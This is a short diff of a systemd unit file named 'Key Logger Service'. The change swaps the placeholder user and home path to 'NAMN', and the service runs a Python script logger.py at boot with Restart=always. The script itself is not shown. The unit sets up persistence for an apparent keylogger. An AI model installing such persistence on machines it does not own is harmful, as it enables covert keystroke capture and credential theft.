@@ -38,8 +38,8 @@ Description=Key Logger Service
 After=network.target
 
 [Service]
-User=user
-ExecStart=/usr/bin/python3 /home/user/logger.py
+User=NAMN
+ExecStart=/usr/bin/python3 /home/NAMN/logger.py
 Restart=always
 
 [Install]
